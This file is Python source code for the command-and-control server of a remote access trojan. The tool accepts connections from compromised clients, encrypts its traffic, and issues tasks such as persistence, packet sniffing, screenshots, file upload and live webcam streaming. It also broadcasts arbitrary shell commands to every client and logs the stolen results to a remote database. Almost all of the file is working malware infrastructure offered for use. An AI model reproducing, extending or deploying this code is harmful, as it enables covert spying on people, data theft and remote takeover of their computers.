#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright (c) 2017 colental
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.


from __future__ import print_function

import os
import sys
import cv2
import json
import time
import numpy
import Queue
import pickle
import socket
import struct
import base64
import random
import urllib2
import functools
import requests
import tempfile
import colorama
import threading
import subprocess
import SocketServer

from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256
from Crypto.Util.number import long_to_bytes, bytes_to_long


BANNER = '''



,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,  aa       aa
""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a 88       88
,adPPPPP88 88       88 8b       88 88	       8b	88
88,    ,88 88       88 "8a,   ,d88 88	       "8a,   ,d88
`"8bbdP"Y8 88       88  `"YbbdP"Y8 88           `"YbbdP"Y8
                        aa,    ,88 	        aa,    ,88
                         "Y8bbdP"          	 "Y8bbdP'

                                               88                          ,d
                                               88                          88
 ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
8PP""""""" 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
"8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
 `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
            aa,    ,88  aa,    ,88 88                                      "Y888
             "Y8bbdP"    "Y8bbdP"  88



'''

# default port for the server to listen on
__PORT__    = 1337  


# default database interaction targets
___DB___    = {
    'domain': None,
    'pages': {
        'results'   : None,
        'query'     : None,
        'session'   : None
        },
    'session_key': None
    }

# enable/disable debugging output
__DEBUG__   = False

# comment/uncomment the following line to disable/enable color 
colorama.init(autoreset=False)



class ServerThread(threading.Thread):

    global threads

    default_tasks = ['info','network','packetsniff','persistence','scan','screenshot','upload','webcam']
    
    def __init__(self, port, **kwargs):
        super(ServerThread, self).__init__()
        self.exit_status    = 0
        self.lock           = threading.Event()
        self.q              = Queue.Queue()
        self.current_client = None
        self.clients        = {}
        self.count          = 1
        self.commands       = {
	    'background'    :   self.background_client,
            'back'          :   self.background_client,
            'bg'            :   self.background_client,
            'client'        :   self.select_client,
            'clients'       :   self.list_clients,
            'exit'          :   self.quit_server,
            'info'          :   self.show_client_info,
            'kill'          :   self.remove_client,
            'threads'       :   self.get_threads,
            'quit'          :   self.quit_server,
            'query'         :   self.query_database,
            'results'       :   self.show_task_results,
            'select'        :   self.select_client,
	    'sendall'	    :   self.sendall_clients,
            'settings'      :   self.settings,
            'webcam'        :   self.webcam_client,
            '--help'        :   self.usage,
            '-h'            :   self.usage,
            '?'             :   self.usage
            }
        self.db             = globals().get('___DB___')
        self._rand_color    = lambda: getattr(colorama.Fore, random.choice(['RED','BLUE','CYAN','GREEN','YELLOW','WHITE','MAGENTA']))
        self._text_color    = self._rand_color()
        self._text_style    = colorama.Style.DIM
        self._prompt_color  = colorama.Fore.RESET
        self._prompt_style  = colorama.Style.BRIGHT
        self.name           = time.time()
        self.db['session_key'] = self.diffiehellman()
        self.s              = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('localhost', port)) if globals().get('__DEBUG__') else self.s.bind(('0.0.0.0', port))
        self.s.listen(100)

    def _prompt(self, data):
        return raw_input(self._prompt_color + self._prompt_style + data + self._text_color + self._text_style)
    
    def _error(self, data):
        if self.current_client:
            self.current_client.lock.clear()
            print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Server Error: ' + data + '\n')
            self.current_client.lock.set()
        else:
            self.lock.clear()
            print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Server Error: ' + data + '\n')
            self.lock.set()

    def _print(self, data):
        print(self._text_color + self._text_style)
        if self.current_client:
            self.current_client.lock.clear()
            print('\n' + data + '\n')
            self.current_client.lock.set()
        else:
            self.lock.clear()
            print('\n' + data + '\n')
            self.lock.set()

    def _return(self):
        if self.current_client:
            self.current_client.lock.set()
            return self.current_client.run()
        else:
            self.current_client = None
            self.lock.set()
            return self.run()

    def _pad(self, data, block_size, padding='\x00'):
        return bytes(data) + (block_size - len(bytes(data)) % block_size) * padding

    def _block(self, data, block_size):
        return [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]

    def _xor(self, a, b):
        return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(a,b))

    def _obfuscate(self, data):
        data = bytearray(i for i in reversed(data))
        z    = self._get_nth_prime(len(data) + 1)
        return base64.b64encode(''.join([(chr(data.pop()) if i in self._get_primes(z) else os.urandom(1)) for i in xrange(z)]))

    def _deobfuscate(self, block):
        return bytes().join(chr(bytearray(base64.b64decode(block))[_]) for _ in self._get_primes(len(bytearray(base64.b64decode(block)))))


    def _get_status(self, c):
        data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
                  '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
                  '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
                  '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
        return ', '.join([i for i in data if i])

    def _get_primes(self, n):
        sieve = numpy.ones(n/3 + (n%6==2), dtype=numpy.bool)
        for i in xrange(1,int(n**0.5)/3+1):
            if sieve[i]:
                k=3*i+1|1
                sieve[       k*k/3     ::2*k] = False
                sieve[k*(k-2*(i&1)+4)/3::2*k] = False
        return numpy.r_[2,3,((3*numpy.nonzero(sieve)[0][1:]+1)|1)]

    def _get_nth_prime(self, p):
        return (self._get_primes(i)[-1] for i in xrange(int(p*1.5), int(p*15)) if len(self._get_primes(i)) == p).next()     

    def _encrypt_xor(self, data, key):
        data    = self._pad(data, 8)
        blocks  = self._block(data, 8)
        vector  = os.urandom(8)
        result  = [vector]
        for block in blocks:
            block   = self._xor(vector, block)
            v0, v1  = struct.unpack('!2L', block)
            k       = struct.unpack('!4L', key[:16])
            s, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
            for r in xrange(32):
                v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (s + k[s & 3]))) & mask
                s = (s + delta) & mask
                v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (s + k[s >> 11 & 3]))) & mask
            output  = vector = struct.pack('!2L', v0, v1)
            result.append(output)
        return base64.b64encode(b''.join(result))

    def _decrypt_xor(self, data, key):
        data    = base64.b64decode(data)
        blocks  = self._block(data, 8)
        vector  = blocks[0]
        result  = []
        for block in blocks[1:]:
            v0, v1 = struct.unpack('!2L', block)
            k = struct.unpack('!4L', key[:16])
            delta, mask = 0x9e3779b9L, 0xffffffffL
            s = (delta * 32) & mask
            for r in xrange(32):
                v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (s + k[s >> 11 & 3]))) & mask
                s = (s - delta) & mask
                v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (s + k[s & 3]))) & mask
            decode = struct.pack('!2L', v0, v1)
            output = self._xor(vector, decode)
            vector = block
            result.append(output)
        return ''.join(result).rstrip(b'\0')
    
    def _encrypt_aes(self, plaintext, key):
        text        = self._pad(plaintext, AES.block_size)
        iv          = os.urandom(AES.block_size)
        cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
        ciphertext  = iv + cipher.encrypt(text)
        hmac_sha256 = HMAC.new(key[max(AES.key_size):], msg=ciphertext, digestmod=SHA256).digest()
        output      = base64.b64encode(ciphertext + hmac_sha256)
        return output

    def _decrypt_aes(self, ciphertext, key):
        ciphertext  = base64.b64decode(ciphertext.rstrip())
        iv          = ciphertext[:AES.block_size]
        cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
        read_hmac   = ciphertext[-SHA256.digest_size:]
        calc_hmac   = HMAC.new(key[max(AES.key_size):], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
        output      = cipher.decrypt(ciphertext[AES.block_size:-SHA256.digest_size]).rstrip(b'\0')
        self._error("HMAC-SHA256 hash authentication check failed - transmission may have been compromised\nExpected: '{}'\nReceived: '{}'".format(calc_hmac, read_hmac)) if calc_hmac != read_hmac else None
        return output
    
    def diffiehellman(self):
        try:
            g  = 2
            p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
            a  = bytes_to_long(os.urandom(32))
            xA = pow(g, a, p)
            xA = hex(xA).strip('L')
            xB = long(requests.post(self.db['domain'] + self.db['pages']['session'], data={'public_key': xA, 'ip': 'localhost'}).content)
            x  = pow(xB, a, p)
            return self._obfuscate(SHA256.new(bytes(x).strip('L')).hexdigest())
        except Exception as e:
            self._error("Diffie-Hellman transactionless key-agreement failed with error: {}\nretrying...".format(str(e)))

    def encrypt(self, data, client_id=None):
        if str(client_id).isdigit() and int(client_id) in self.clients:
            client = self.clients[int(client_id)]
        elif self.current_client:
            client = self.current_client
        else:
            self._error("Failed to encrypt data '{}' - invalid Client ID: {}".format(data, client_id))
            self._return()
        try:
            return self._encrypt_aes(data, self._deobfuscate(client.session_key)) if len(self._deobfuscate(client.session_key)) == 64 else self._encrypt_xor(data, self._deobfuscate(client.session_key))
        except Exception as e:
            self._error(str(e))

    def decrypt(self, data, client_id=None):
        if str(client_id).isdigit() and int(client_id) in self.clients:
            client = self.clients[int(client_id)]
        elif self.current_client:
            client = self.current_client
        else:
            self._error("Failed to decrypt data '{}' - invalid Client ID: {}".format(data, client_id))
            self._return()
        try:
            return self._decrypt_aes(data, self._deobfuscate(client.session_key)) if len(self._deobfuscate(client.session_key)) == 64 else self._decrypt_xor(data, self._deobfuscate(client.session_key))        
        except Exception as e:
            self._error(str(e))

    def send_client(self, command, client_id=None):
        if str(client_id).isdigit() and int(client_id) in self.clients:
            client = self.clients[int(client_id)]
        elif self.current_client:
            client = self.current_client
        else:
            self._error("Failed to send command '{}' - Invalid Client ID: {}".format(command, client_id))
            self._return()
        try:
            task_id = self.new_task_id(command, client_id)
            task    = {'id': task_id, 'client': client.id, 'command': command}
            data    = self.encrypt(json.dumps(task), client.name) + '\n'
            client.connection.sendall(data)
        except Exception as e:
            self._error(str(e))
    
    def recv_client(self, client_id):
        if str(client_id).isdigit() and int(client_id) in self.clients:
            client  = self.clients[int(client_id)]
            buf     = ''
            while '\n' not in buf:
                try:
                    buf += client.connection.recv(4096)
                except: break
            if len(buf):
                data = self.decrypt(buf, client.name)
                return json.loads(data)
        else:
            self._error('Invalid Client ID')
    
    def get_clients(self):
        return [v for v in self.clients.values()]

    def select_client(self, client_id):
        if not str(client_id).isdigit() or int(client_id) not in self.clients:
            self._error('Unable to select client {} - Invalid Client ID'.format(client_id))
            self._return()
        else:
            self.lock.clear()
            if self.current_client:
                self.current_client.lock.clear()
            client = self.clients[int(client_id)]
            self.current_client = client
            self._print('\n\nClient {} selected'.format(client_id))
            return self.current_client.run()

    def background_client(self, client_id=None):
        if not client_id:
            if self.current_client:
                self.current_client.lock.clear()
        elif str(client_id).isdigit() and int(client_id) in self.clients:
                self.clients[int(client_id)].lock.clear()
        self.current_client = None
        self.lock.set()
        return self.run()
    
    def sendall_clients(self, msg):
        for client in self.get_clients():
            try:
                self.send_client(msg, client.name)
            except Exception as e:
                self._error('Message to client {} failed with error: {}'.format(client.name, str(e)))
        self._return()
    
    def remove_client(self, client_id):
        if not str(client_id).isdigit() or int(client_id) not in self.clients:
            return
        else:
            client = self.clients[int(client_id)]
            client.lock.clear()
            self.send_client('kill', client_id)
            client.connection.close()
            _ = self.clients.pop(int(client_id), None)
            del _
            if not self.current_client:
                self.lock.clear()
                self._print('Client {} disconnected'.format(client_id))
                self.lock.set()
                return self.run()
            elif int(client_id) == self.current_client.name:
                self.current_client.lock.clear()
                self.lock.set()
                self._print('Client {} disconnected'.format(client_id))
                self.lock.clear()
                self.current_client.lock.set()
                return self.current_client.run()
            else:
                self.current_client.lock.clear()
                self.lock.set()
                self._print('Client {} disconnected'.format(client_id))
                self.lock.clear()
                self.current_client.lock.set()
                return self.current_client.run()

    def show_client_info(self, client_id=None):
        if str(client_id).isdigit() and int(client_id) in self.clients:
            client = self.clients[int(client_id)]
            self._print('\n'.join(['\n {}{:>20}'.format('ENVIRONMENT','VARIABLES')] + [' --------------------------------'] + [' {:>13} {:>18}'.format(a,b) for a,b in client.info.items()]) + '\n')
        elif self.current_client:
            client = self.current_client
            self._print('\n'.join(['\n {}{:>20}'.format('ENVIRONMENT','VARIABLES')] + [' --------------------------------'] + [' {:>13} {:>18}'.format(a,b) for a,b in client.info.items()]) + '\n')
        else:
            self._error('Unable to display client information - invalid Client ID')
        self._return()

    def list_clients(self):
        print(self._text_color + colorama.Style.BRIGHT + '\n{:>3}'.format('#') + colorama.Fore.YELLOW + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>64}'.format('Client ID') + colorama.Style.DIM + colorama.Fore.YELLOW + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format('Address') + colorama.Style.DIM + colorama.Fore.YELLOW  + '\n-----------------------------------------------------------------------------------------')
        for k, v in self.clients.items():
            print(self._text_color + colorama.Style.BRIGHT + '{:>3}'.format(k) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format(v.id) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format(v.addr[0]))
        print('\n')
        self._return()
          
    def quit_server(self):
        for client in self.get_clients():
            try:
                self.send_client('standby', client.name)
            except Exception as e:
                print(str(e))
        exit()

    def get_threads(self):
        self._print('Session Key: {}'.format(self._deobfuscate(self.db.get('session_key'))))
        self._print('\n'.join([' {:>20}\t{:>40}'.format('Threads','Status'), ' ---------------------------------------------------------------']  + [' {:>20}\t{:>40}'.format(a, self._get_status(c=time.time()-float(threads[a].name))) for a in threads if threads[a].is_alive()]) + '\n')

    def settings(self, args=None):
        if not args:
            print(colorama.Fore.WHITE + '\n\t\tSettings')
            print(self._text_color + self._text_style + '\tdefault text color + style')
            print(self._prompt_color + self._prompt_style + '\tdefault prompt color + style\n')
        else:
            target, _, options = args.partition(' ')
            setting, _, option = options.partition(' ')
            option = option.upper()
            if target == 'prompt':                
                if setting == 'color':
                    if not hasattr(colorama.Fore, option):
                        self._print("usage: settings prompt color [value]\ncolors:   white/black/red/yellow/green/cyan/magenta")
                    self._prompt_color = getattr(colorama.Fore, option)
                    self._print("prompt color changed to '{}'".format(option))
                elif setting == 'style':
                    if not hasattr(colorama.Style, option):
                        self._print("usage: settings prompt style [value]\nstyles:   bright/normal/dim")
                    self._prompt_style = getattr(colorama.Style, option)
                    self._print("prompt style changed to '{}'".format(option))
                else:
                    self._print("usage: settings prompt <option> [value]")
            elif target == 'text':
                if setting == 'color':
                    if not hasattr(colorama.Fore, option):
                        self._print("usage: settings text color [value]\ncolors:     white/black/red/yellow/green/cyan/magenta")
                    self._text_color = getattr(colorama.Fore, option)
                    self._print("text color changed to '{}'".format(option))
                elif setting == 'style':
                    if not hasattr(colorama.Style, option):
                        self._print("usage: settings text style [value]\nstyles:     bright/normal/dim")
                    self._text_style = getattr(colorama.Style, option)
                    self._print("text style changed to '{}'".format(option))
                else:
                    self._print("usage: settings text <option> [value]")
        self._return()

    def usage(self):
        print('\n')
        print(colorama.Fore.YELLOW  + colorama.Style.DIM    + '--------------------------------------------------------------------')
        print(self._text_color + colorama.Style.BRIGHT + '    command <argument>      ' + colorama.Fore.YELLOW + colorama.Style.DIM + '|' + colorama.Style.BRIGHT + self._text_color + ' descripton')
        print(colorama.Fore.YELLOW  + colorama.Style.DIM    + '--------------------------------------------------------------------')
        print(self._text_color + self._text_style + '    bg / back / background  ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Push current client to background')
        print(self._text_color + self._text_style + '    clients                 ' + colorama.Fore.YELLOW + '|' + self._text_color + ' List connected clients')
        print(self._text_color + self._text_style + '    client <id>             ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Connect to a client')
        print(self._text_color + self._text_style + '    kill <id>               ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Remove client from connection pool')
        print(self._text_color + self._text_style + '    exit / quit             ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Exit server and keep clients alive')
        print(self._text_color + self._text_style + '    query                   ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Query database and return output')
        print(self._text_color + self._text_style + '    results <id>            ' + colorama.Fore.YELLOW + '|' + self._text_color + ' List task results from database')
        print(self._text_color + self._text_style + '    sendall <command>       ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Send command to all clients')
        print(self._text_color + self._text_style + '    settings <options>      ' + colorama.Fore.YELLOW + '|' + self._text_color + ' Edit color/style settings')
        print(self._text_color + self._text_style + '    threads                 ' + colorama.Fore.YELLOW + '|' + self._text_color + ' List currently active threads')
        print(colorama.Fore.YELLOW  + colorama.Style.DIM    + '--------------------------------------------------------------------')
        print(self._text_color + self._text_style + '< > = required argument')
        print(self._text_color + self._text_style+ '[ ] = optional argument\n')
        print('\n')


    def webcam_client(self, args=''):
        if not self.current_client:
            self._error( "No client selected")
        client = self.current_client
        result = ''
        mode, _, arg = args.partition(' ')
        client.lock.clear()
        if not mode or str(mode).lower() == 'stream':
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            retries = 5
            while retries > 0:
                try:
                    port = random.randint(6000,9999)
                    s.bind(('0.0.0.0', port))
                    s.listen(1)
                    cmd = 'webcam stream {}'.format(port)
                    self.send_client(cmd, client.name)
                    conn, addr  = s.accept()
                    break
                except:
                    retries -= 1
            header_size = struct.calcsize("L")
            window_name = addr[0]
            cv2.namedWindow(window_name)
            data = ""
            try:
                while True:
                    while len(data) < header_size:
                        data += conn.recv(4096)
                    packed_msg_size = data[:header_size]
                    data = data[header_size:]
                    msg_size = struct.unpack("L", packed_msg_size)[0]
                    while len(data) < msg_size:
                        data += conn.recv(4096)
                    frame_data = data[:msg_size]
                    data = data[msg_size:]
                    frame = pickle.loads(frame_data)
                    cv2.imshow(window_name, frame)
                    key = cv2.waitKey(70)
                    if key == 32:
                        break
            finally:
                conn.close()
                cv2.destroyAllWindows()
                client.lock.set()
        else:
            self.send_client(args, client.name)

    
    def new_task_id(self, command, client_id=None):
        if str(client_id).isdigit() and int(client_id) in self.clients:
            client = self.clients[int(client_id)]
        elif self.current_client:
            client = self.current_client
        else:
            self._error("Task ID failed - invalid Client ID")
            self._return()
        try:
            return SHA256.new(bytes(client.id) + bytes(command) + bytes(time.time())).hexdigest()
        except Exception as e:
            self._error(str(e))

    def show_task_results(self, client_id=None):
        if str(client_id).isdigit() and int(client_id) in self.clients:
            return self.query_database("SELECT * FROM tasks WHERE client='{}'".format(self.clients[int(client_id)].id).replace("Array\n(", "").replace("\n)", ""))
        elif self.current_client:
            return self.query_database("SELECT * FROM tasks WHERE client='{}'".format(self.current_client.id).replace("Array\n(", "").replace("\n)", ""))
        else:
            return '\n'.join([self.query_database("SELECT * FROM tasks WHERE client='{}'".format(client.id).replace("Array\n(", "").replace("\n)", "")) for client in self.get_clients()])

    def save_task_results(self, task):
        if type(task) is dict:
            cmd, _, action = bytes(task.get('command')).partition(' ')
            if cmd in self.default_tasks:
                try:
                    output  = self.query_database("INSERT INTO tasks (task_id, client, task, data) VALUES ({})".format(', '.join("'{}'".format(i) for i in (task['id'], task['client'], task['command'], task['data']))))
                except Exception as e:
                    self._error("{} returned error: {}".format(self.save_task_results.func_name, str(e)))
        else:
            self._error('Invalid task: {}'.format(bytes(task)))
            self._return()

    def query_database(self, query):
        key     = self.db['session_key'] if self.db.get('session_key') else self.diffiehellman()
        query   = self._encrypt_aes(query, self._deobfuscate(key))
        data    = requests.post(self.db['domain'] + self.db['pages']['query'], data={'query': query}).content
        output  = self._decrypt_aes(data, self._deobfuscate(key)) if data else data
        return output

    def connection_handler(self):
        while True:
            connection, addr   = self.s.accept()
            name               = self.count
            client             = ClientHandler(connection, addr, name)
            self.clients[name] = client
            client.connection.setblocking(True)
            self._print("\nReceived connection from {}\n".format(client.addr[0]))
            self.count  += 1
            client.start()

    def run(self):
        self.lock.set()
        while True:
            try:
                self.lock.wait()
                output              = ''
                cmd_buffer          = self._prompt("[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER'))) % os.getcwd())
                if cmd_buffer:
                    cmd, _, action  = cmd_buffer.partition(' ')
                    if cmd in self.commands:
                        try:
                            output  = self.commands[cmd](action) if len(action) else self.commands[cmd]()
                        except Exception as e1:
                            output  = str(e1)
                    elif cmd == 'cd':
                        os.chdir(action)
                    else:
                        try:
                            output = subprocess.check_output(cmd_buffer, shell=True)
                        except: pass
                    if output and len(str(output)):
                        self._print(str(output))
                if not self.connection_handler.func_name in threads or not threads[self.connection_handler.func_name].is_alive():
                    threads[self.connection_handler.func_name] = threading.Thread(target=self.connection_handler, name=time.time())
                    threads[self.connection_handler.func_name].start()
                if self.exit_status:
                    break
            except KeyboardInterrupt:
                break
        print('Server shutting down')
        exit()


    def start(self):
        threads[self.connection_handler.func_name] = threading.Thread(target=self.connection_handler, name=time.time())
        threads[self.run.func_name] = threading.Thread(target=self.run, name=time.time())
        threads[self.connection_handler.func_name].start()
        threads[self.run.func_name].start()


class ClientHandler(threading.Thread):

    global threads

    def __init__(self, connection, addr, name):
        super(ClientHandler, self).__init__()
        self.prompt         = None
        self.connection     = connection
        self.addr           = addr
        self.name           = name
        self.lock           = threading.Event()
        self.session_key    = self.diffiehellman()
        self.info           = self._info()
        self.id             = self._register()
        
    def _prompt(self, data):
        return raw_input(threads['server']._prompt_color + threads['server']._prompt_style + bytes(data).rstrip())
             
    def _error(self, data):
        self.lock.clear()
        print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Client {} Error: '.format(self.name) + bytes(data) + '\n')
        self.lock.set()

    def _info(self):
        buf  = ''
        while '\n' not in buf:
            buf += self.connection.recv(1024)
        try:
            data = threads['server']._decrypt_aes(buf.rstrip(), threads['server']._deobfuscate(self.session_key))
        except Exception as e1:
            self._error("AES encryption failed: {}".format(str(e1)))
            try:
                data = threads['server']._decrypt_xor(buf.rstrip(), threads['server']._deobfuscate(self.session_key))
            except Exception as e2:
                self._error("XOR encryption failed: {}".format(str(e2)))
        try:
            return json.loads(data.rstrip())
        except Exception as e3:
            self._error("Loading data in JSON format failed: {}".format(str(e1)))

    def _register(self):
        try:
            client_id   = SHA256.new(bytes(self.info['ip']) + bytes(self.info['mac'])).hexdigest()
            try:
                session = requests.post(threads['server'].db['domain'] + threads['server'].db['pages']['session'], data={'ip': self.info['ip'], 'session_key': self.session_key}).content
                query   = "UPDATE clients SET {} WHERE ip='%s'".format(', '.join("{}='{}'".format(k,v) for k,v in self.info.items() + [('hash', client_id)])) % self.info['ip']
                threads['server'].query_database(query)
                data    = threads['server']._encrypt_aes(client_id, threads['server']._deobfuscate(self.session_key)) if 'AES' in self.info['encryption'] else threads['server']._encrypt_xor(uid, threads['server']._deobfuscate(self.session_key))
                self.connection.sendall(data + '\n')
            except Exception as e:
                self._error(str(e))
            return client_id
        except Exception as e2:
            self._error("Client registration failed: {}".format(str(e2)))

    def diffiehellman(self):
        try:
            g  = 2
            p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
            a  = bytes_to_long(os.urandom(32))
            xA = pow(g, a, p)
            self.connection.send(long_to_bytes(xA))
            xB = bytes_to_long(self.connection.recv(256))
            x  = pow(xB, a, p)
            y  = SHA256.new(long_to_bytes(x)).hexdigest()
            return threads['server']._obfuscate(y)
        except Exception as e:
            self._error("Diffie-Hellman transactionless key-agreement failed with error: {}".format(str(e)))

    def run(self):
        while True:
            try:
                self.lock.wait()
                task = self.prompt if self.prompt else threads['server'].recv_client(self.name)
                if 'prompt' == task.get('command'):
                    self.prompt     = task.get('data')
                    command         = self._prompt(bytes(self.prompt).format(self.name))
                    cmd, _, action  = bytes(command).partition(' ')
                    if cmd in threads['server'].commands:
                        result = threads['server'].commands[cmd](action) if len(action) else threads['server'].commands[cmd]()
                        if result:
                            threads['server']._print(result)
                            threads['server'].save_task_results(task)
                        continue
                    else:
                        threads['server'].send_client(command, self.name)
                else:
                    if task.get('data'):
                        threads['server']._print(task['data'])                      
                        threads['server'].save_task_results(task)
                self.prompt = None
                if threads['server'].exit_status:
                    break
            except Exception as e:
                self._error(str(e))
                break
        self.lock.clear()
        threads['server'].lock.set()
        threads['server'].current_client = None
        threads['server'].remove_client(self.name)
        threads['server'].run()


if __name__ == '__main__':
    port    = int(__PORT__)
    threads = {}
    threads['server'] = ServerThread(port)
    os.system('cls' if os.name is 'nt' else 'clear')
    print(threads['server']._rand_color() + BANNER + colorama.Fore.WHITE)
    print(colorama.Fore.YELLOW + "[?] " + colorama.Fore.WHITE + "-h/--help for usage information\n\n\n")
    threads['server'].start()   
 
